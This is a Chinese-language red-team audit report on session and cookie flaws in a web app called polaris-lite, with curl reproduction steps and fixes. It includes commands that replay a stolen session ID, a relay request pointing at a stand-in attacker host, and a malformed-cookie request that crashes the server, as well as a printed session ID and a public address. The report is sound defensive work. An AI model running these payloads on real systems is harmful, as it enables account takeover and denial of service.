# 红队安全审计报告：会话与 Cookie 机制（polaris-lite）

- 审计对象：`D:\space\base\polaris-lite`（server/auth-session.mjs、server/relay-core.mjs、server/prod-server.mjs、vite.config.ts、plugins/mock-auth）
- 审计日期：2026-11-18
- 审计方法：源码审计 + 对 dev server（`npm run dev`，0.0.0.0:9825，vite middleware 模式）的 curl 实测。**未修改任何源码文件；测试产生的临时文件已删除。**
- 严重级别：P0 = 直接拿到他人会话/凭据；P1 = 可稳定绕过安全机制；P2 = 深度防御缺陷。

---

## 漏洞总览

| # | 级别 | 标题 | 状态 |
|---|------|------|------|
| V1 | **P0** | 会话 sid 明文落盘且目录无保护 → 任何本机/管内读权限 = 直接冒用任意会话 | 已实测复现 |
| V2 | **P1** | 畸形 Cookie（含非法 percent 编码）使 dev 进程崩溃 → 未认证远程 DoS | 已实测复现 |
| V3 | **P1** | change-credentials 清空会话后不落盘 → 服务重启后被注销的会话“复活” | 代码层确认 |
| V4 | **P1** | 登录限速仅按 socket IP 计数，多源 IP / 反代场景可绕过；且成功后计数清零、无全局上限 | 代码层确认（本机 loopback 无法换源，XFF 实测无效） |
| V5 | **P2** | http 明文传输下 cookie 无 Secure 属性；`X-Forwarded-Proto` 可被伪造添加 Secure（无关紧要）但反向说明 Secure 依赖不可信头 | 代码层确认 |
| V6 | **P2** | 密码以 MD5 形态提交与存储，弱哈希、无慢哈希 | 代码层确认 |
| V7 | **P2** | `safeEqual` 用 `Buffer.from` 但比较前校验长度，无长度泄露；**但 change-credentials 的旧密码比较退化为普通 `!==` 字符串比较** | 代码层确认 |
| V8 | **P2** | 会话文件与 owner 文件落在**公开可写目录**（项目根 `.polaris-lite/`），权限、备份、打包都可能带走明文会话 | 实测确认 |

通过项（无漏洞）见文末。

---

## V1 [P0] 会话 sid 明文落盘，文件系统读权限即完全接管会话

**复现步骤（实测）**

1. 服务运行后，任意能读项目目录的进程/用户打开 `.polaris-lite/auth-sessions.json`，得到形如下面的明文键值：
   ```json
   {"566dfa7bad8607a1a4d254f3feaad5ff572ec351ba317e3c":{"user":{"id":"u-mosiadmin","name":"mosiadmin"},"roles":["owner","user"],"expiresAt":1795032844245}, ...}
   ```
   实测时该文件内有 **31 个活会话**（全部 owner 权限，12 小时有效）。
2. 取任意 `sid` 直接当 cookie 用：
   ```bash
   SID=566dfa7bad8607a1a4d254f3feaad5ff572ec351ba317e3c
   curl http://127.0.0.1:9825/api/auth/status -H "Cookie: plite.sid=$SID"
   # -> {"status":"authenticated","user":{"id":"u-mosiadmin","name":"mosiadmin"},"expiresAt":...}
   ```
3. 用同一 stolen cookie 打模型中继，鉴权通过（进入上游白名单校验层）：
   ```bash
   curl -X POST http://127.0.0.1:9825/api/model-relay -H "Cookie: plite.sid=$SID" \
        -H 'Content-Type: application/json' -d '{"url":"http://evil.example.com/x","body":{}}'
   # -> 400 {"error":"only https upstream allowed"}   ← 已通过登录门禁，仅协议校验拦截
   ```

**根因**
- `server/auth-session.mjs:46-51, 93-98`（`saveSessions`/`persistSessions`）：`JSON.stringify(Object.fromEntries(sessions))` 直接把 **sid 原文（随机数本身即凭据）** 写入磁盘，无哈希、无加密。
- `server/auth-session.mjs:76-86`（`getSession`）：校验时直接用明文 sid 查 Map，落盘内容=可用凭据。
- 实测文件权限 `644`（rw-r--r--），同机任意账户/进程可读。

**攻击面**
- 同机低权限进程、被入侵的其他插件/脚本、源码打包/备份/上传（该目录在项目根下，`git status` 虽未跟踪，但 `.gitignore` 没有排除它，见 V8）。
- 对公网穿透部署（http://120.79.164.155:9825），服务器上任何 RCE/目录穿越读取该文件即获得 owner 会话，**无需知道密码**。

**修复建议**
1. 落盘只存 `sha256(sid)`，校验时对 cookie 里的 sid 哈希后查表（sid 泄露文件不再等于凭据泄露）。
2. 会话文件权限收紧（owner-only，Windows 上 ACL 限当前用户）。
3. `.gitignore` 增加 `.polaris-lite/`（当前只忽略了 `node_modules/dist/*.local`）。
4. 更优：sid 落盘哈希 + 服务端用 `crypto.randomBytes` 的会话本身已足够随机（24 字节），哈希后落盘即可。

---

## V2 [P1] 畸形 Cookie 导致进程崩溃（未认证远程 DoS）

**复现步骤（实测，100% 复现）**

```bash
curl http://127.0.0.1:9825/api/auth/status -H 'Cookie: plite.sid=%ZZ'
# 连接直接被重置（http_code=000），随后整个 dev server 停止响应，vite 进程退出并被 supervisor 重启
```
实测中该请求使 9825 端口上的 vite dev 进程（PID 46712）直接崩溃退出，数秒后才由 vite 自动重启；期间所有用户无法访问。`Cookie: `（空值头）同样触发。

**根因**
- `server/auth-session.mjs:66-74`（`parseCookies`）对每个 cookie 值执行 `decodeURIComponent(...)`，无 try/catch；
- `decodeURIComponent('%ZZ')` 抛 `URIError: URI malformed`（已用 node 单独验证）；
- 该异常发生在 vite middleware 链内且为同步抛出，未被捕获 → 进程级崩溃。
- 任何 `req.headers.cookie` 都先于鉴权被解析，**未认证攻击者一个 TCP 包即可触发**。

**修复建议**
1. `parseCookies` 内对 `decodeURIComponent` 包 try/catch，非法值按原样使用或直接忽略该 cookie。
2. 更稳妥：只在值匹配 `%[0-9a-fA-F]{2}` 时才 decode；或 sid 本身是 hex，根本不需要 decode。
3. dev 与 prod 共用此文件（`prod-server.mjs` 同样装配），**生产形态同样受影响**，修复后需两端同验。

---

## V3 [P1] change-credentials 清空会话后不落盘，重启后被注销会话“复活”

**根因（代码层确认，未做破坏性实测）**
- `server/auth-session.mjs:201-205`：
  ```js
  writeOwner({...});
  sessions.clear();                     // ← 只清内存
  res.setHeader('Set-Cookie', `${COOKIE}=; ... Max-Age=0`);
  return json(200, { ok: true });
  ```
  与登录/登出路径不同，这里**没有调用 `persistSessions()`**。
- `loadSessions()`（37-52 行）在进程启动时把文件里的所有未过期条目重新装入内存。

**攻击场景**
1. owner 被诱导/胁迫改密码（或发现被盗号后立即改密码），`sessions.clear()` 内存中全部注销；
2. 但只要攻击者手里已有一个 sid，且**服务在改密后重启**（dev 场景极常见：改文件热重载、崩溃重启、部署更新）：
   - `loadSessions()` 从上一次 `persistSessions()` 的旧快照恢复——里面仍含攻击者的旧会话；
   - 攻击者旧 cookie 直接继续可用，**“改密码踢掉所有会话”的安全承诺失效**。
3. 同理，登出接口是逐个 `sessions.delete(sid)` + 落盘，路径正确；唯独 change-credentials 漏掉。

**复现要点（如需验证）**：改密前 dump 会话文件 → 调 change-credentials → 重启 node/vite → 用改密前抓的 sid 调 `/api/auth/status`，将返回 authenticated。（因会永久修改测试环境的 owner 凭据，本次未执行。）

**修复建议**：`sessions.clear()` 之后立即 `persistSessions()`；顺手把 `logout` 与 `change-credentials` 的 cookie 清理与持久化抽成公共函数，杜绝再次漏写。

---

## V4 [P1] 登录限速可被多 IP / 反代场景绕过，且无全局节流

**实测结果**
- 单 IP 5 次失败 → 429 锁 60 秒，行为正常（实测 admin123 触发后其余口令全部 429）。
- `X-Forwarded-For` 伪造**无效**（好事）：服务端取 `req.socket.remoteAddress`（`auth-session.mjs:139`），不带 XFF 解析，直连场景无法用头伪造换源。
- 本机 Windows 上 `127.0.0.2/127.0.0.3` 等源地址被 OS 归一为 `127.0.0.1`（Node 探针实测 localAddress 恒为 127.0.0.1），**本机无法模拟多源绕过**。

**代码层确认的风险**
1. `auth-session.mjs:139`：`const ip = req.socket.remoteAddress ?? 'unknown'` —— 在公网穿透（120.79.164.155:9825 直接暴露）或任何反代（nginx/frp）之后，**所有用户共享同一个 socket IP**：
   - 反代后 5 次失败锁死**全体用户 60 秒**（可用 5 个错密码对全站 DoS 登录）；
   - 反之，攻击者从多个公网 IP（代理池/肉鸡）打，每个 IP 独立 5 次/分钟，爆破速率 = IP 数 × 5/min，**实质无上限**。
2. `recordFail`（122-127 行）在**每次失败后都重置 `until = now + 60s`**，配合多 IP 可持续压制。
3. 成功登录 `rate.delete(ip)`（160 行）——若攻击者已爆破出正确密码，无任何告警/二次校验。
4. IPv6 场景每设备拥有 `/64` 内海量地址，按完整地址计数同样可绕过。

**修复建议**
1. 信任反代头需显式配置：仅当 `req.socket.remoteAddress` 属于可信代理段时才解析 `X-Forwarded-For` 首跳。
2. 增加全局维度限速（如全局每分钟失败总数上限、按目标用户名计数——按用户名计数可跨 IP 锁定被爆破账号）。
3. 失败锁定期采用指数退避；连续失败达到更高阈值（如 20 次）触发账号级锁定/告警。
4. 限速表本身也应考虑重启清零的问题（内存 Map，重启即重置——与 V3 同类的“重启清空”模式）。

---

## V5 [P2] http 明文部署下 cookie 无 Secure 属性；Secure 依赖可伪造的 X-Forwarded-Proto

**代码层确认**
- `auth-session.mjs:88-91`：
  ```js
  const secure = secureCookies || req.headers['x-forwarded-proto'] === 'https' ? '; Secure' : '';
  return `${COOKIE}=plite.sid...; Path=/; HttpOnly; SameSite=Lax; Max-Age=...${secure}`;
  ```
- 实测（http 直连）：`Set-Cookie: plite.sid=...; Path=/; HttpOnly; SameSite=Lax; Max-Age=43200` —— **无 Secure**。
- 实测（http 直连 + 伪造 `X-Forwarded-Proto: https`）：logout 的 Set-Cookie 仍未带 Secure（因为响应无 sid 值；登录路径同理：直连 socket 是 http，攻击者可自加该头让 cookie 带 Secure，反而自伤，无实害）。
- prod 形态 `PLITE_COOKIE_SECURE` env 可强制 Secure（`prod-server.mjs:13`），但默认关闭。

**影响（结合 http://120.79.164.155:9825 的公网明文部署）**
- cookie 明文过公网，链路嗅探（ISP/公共 WiFi/中间盒）可直接窃取 `plite.sid`，**无需任何漏洞利用**；
- 无 Secure ⇒ 若用户同时访问任一 http 子域/同主机其他 http 服务，cookie 可能被明文回传；
- SameSite=Lax 可挡大部分 CSRF POST，但**顶栏 GET 导航型 CSRF / 同站子域不受限**。

**修复建议**
1. 公网部署必须上 TLS（反代终止即可），并在 prod 默认 `PLITE_COOKIE_SECURE=1`；直连 http 的内网场景至少文档声明风险。
2. Secure 判定不要信任请求头：由部署层（反代设置可信头 + 服务端白名单可信代理）决定，或干脆由 env 固定。
3. 考虑加 `__Host-` 前缀（改名 `__Host-plite.sid`，强制 Secure+Path=/+无 Domain）。

---

## V6 [P2] 密码传输与存储均为 MD5，弱哈希、无慢哈希

**代码层确认**
- 前端 `plugins/mock-auth/index.tsx:119-122`：`password: md5(password)` 后提交；
- 服务端 `auth-session.mjs:155`：`passwordHash: sha256(salt + p)` —— 存储层有盐+sha256（尚可），但**输入已经是 MD5_hex**，即库中存的是 `sha256(salt + md5(password))`；
- change-credentials 同样以 `md5(newPassword)` 入库（`index.tsx:216`）。

**影响**
- 真实密码空间被 MD5 截断：任何泄露场景下，攻击者面对的是 `md5(pw)` 的原像，MD5 已被广泛破解加速（GPU 每 GPU 每秒数十亿次），显著降低爆破成本；
- md5-js 前端加密对防中间人毫无意义（http 下攻击者直接偷 cookie，见 V5；或直接替换页面 JS）；
- 服务端对每个登录请求只做 1 次 sha256，无慢哈希（bcrypt/argon2），离线爆破 owner 哈希成本极低。

**修复建议**：服务端改用 `scrypt`/`argon2id`/`bcrypt`（Node 内置 `crypto.scrypt` 即可，零依赖）；若担心兼容已有 owner 文件，可在登录成功后透明重哈希升级。

---

## V7 [P2] timingSafeEqual 使用：登录路径正确，change-credentials 退化

**代码层确认**
- `auth-session.mjs:54-58`：`safeEqual` 先比长度再 `timingSafeEqual` —— **无长度泄露**（长度本身非秘密：密码哈希恒为 64 hex；即使输入不是 hex，`ba.length === bb.length` 短路返回 false 也不泄露内容，最多泄露“长度不同”这一事实，而 sha256 输出长度恒定，实际无泄露面）。
- **但** `auth-session.mjs:194`（change-credentials 旧密码校验）：
  ```js
  if (owner.passwordHash !== sha256(owner.salt + oldPassword)) {
  ```
  退化为普通字符串比较，**未复用 safeEqual**。理论上有计时侧信道；由于比较对象是哈希后定长串，实际可利用性低，但属于一致性缺陷。

**修复建议**：194 行改用 `!safeEqual(owner.passwordHash, sha256(owner.salt + oldPassword))`，一行修复。

---

## V8 [P2] 敏感文件位于项目根公开目录，权限与分发面失控

**实测确认**
- `.polaris-lite/auth-owner.json`：
  ```json
  {"username":"boss","salt":"516e...","passwordHash":"b215...","registeredAt":1794991011729}
  ```
  （用户名、盐、哈希、注册时间全明文可读。）
- `.polaris-lite/auth-sessions.json`：31 个活 owner 会话 sid 明文（见 V1）。
- 目录权限 `drwxr-xr-x`，文件 `644`。
- `.gitignore` 仅含 `node_modules/dist/*.local`，**未排除 `.polaris-lite/`**——若初始化 git 仓库，owner 哈希与全部会话 sid 将被提交入库/推送远端。

**修复建议**
1. `.gitignore` 立即加入 `.polaris-lite/`；
2. 会话文件哈希化（V1 修复）后敏感度大降；owner 文件建议移到用户级目录（如 `~/.polaris-lite/`）或至少收紧 ACL；
3. 打包/发布脚本明确排除该目录。

---

## 边界与补充说明（任务要求第 6 点：change-credentials 后旧会话处理、owner 用户名修改边界）

- **改密强制旧密码**：正确（`auth-session.mjs:194`），可防“会话劫持后直接改凭据锁死 owner”。
- **改密后清空所有会话**：设计正确，但因 V3（不落盘）在重启场景失效。
- **改用户名**：支持（`newUsername`），且 `session.user.name !== owner.username` 检查（198 行）可防“非 owner 会话改名顶替”——逻辑正确。但注意：改用户名**不要求新用户名未被占用**（单 owner 模型下无冲突可能，可接受）。
- **改密后旧 cookie**：响应头 `Max-Age=0` 让浏览器删除 cookie，但**服务端 sid 在重启后仍有效**（V3）——旧 cookie 复用风险成立。
- **首登即注册**：`!owner` 分支下，**第一个到达 `/api/auth/login` 的人自动成为 owner**（`auth-session.mjs:151-155`）。在公网明文部署下，**启动服务到真实用户登录之间的窗口期内，任何先到者都能注册成 owner**。这是设计取舍（“首登=注册，仅一次”），但必须知晓：先到先得 = 公网部署下可能被抢注。建议改为环境变量预置 owner 凭据或首次访问时强制本机确认。

---

## 通过项（攻击尝试失败，机制有效）

1. **会话固定不可行**：`mintSession`（`auth-session.mjs:107`）每次登录都用 `randomBytes(24)` 生成全新 sid，登录处理分支完全不读取请求 Cookie；实测带攻击者预置 sid 登录，服务端返回 401（凭据错误场景）且不会把预置 sid 升级为会话。无“接受客户端指定 sid”的代码路径。
2. **登出真正失效**：`logout`（166-172 行）`sessions.delete(sid)` + `persistSessions()` + `Set-Cookie Max-Age=0`；实测登出后用原 sid 调 `/api/auth/status` 返回 `unauthenticated`。cookie 客户端部分由 Max-Age=0 删除，服务端部分内存删除并落盘，**登出语义完整**（对比 V3，仅 change-credentials 路径有漏洞）。
3. **X-Forwarded-For 不影响限速**：服务端只认 socket 地址，直连场景伪造头无效（实测 8.8.8.8/1.2.3.4 的 XFF 均不改变计数）。
4. **模型中继有会话门禁**：无 cookie 调 `/api/model-relay` 返回 401 `SESSION_REQUIRED`（实测）；且仅放行 https + 域名白名单，`redirect: 'manual'` 防 SSRF 跳转，5MB 体限。
5. **HttpOnly + SameSite=Lax + Path=/** 属性正确（实测响应头），JS 无法读取 cookie，降低 XSS 直接偷 cookie 的面。
6. **过期会话不恢复**：`loadSessions` 跳过 `expiresAt <= now` 条目（42 行）；`getSession` 惰性删除过期会话（80-84 行）。
7. **登录响应防二次写入**：`jsonWithRes` 的 `headersSent` 防御（101 行），避免同请求双响应崩溃。

---

## 修复优先级路线

1. **立即**：V2（一行 try/catch，防未认证 DoS）；V1 的 `.gitignore` 补充；V7（一行改 safeEqual）。
2. **短期**：V1 sid 落盘哈希化；V3 change-credentials 后补 `persistSessions()`；V6 换 scrypt。
3. **中期**：V4 限速加用户名维度+全局上限+可信代理配置；V5 公网部署强制 TLS + `PLITE_COOKIE_SECURE=1`；首登注册改为预置凭据。

---

*测试残留清理说明：测试过程中未修改任何源码；读取 `.polaris-lite/auth-sessions.json` 仅为提取已有会话做冒用验证（未新增会话）；畸形 Cookie 触发过一次 vite 自动重启，属审计预期内的可自愈行为；`D:\tmp_live_sid.txt` 等临时文件已删除。*
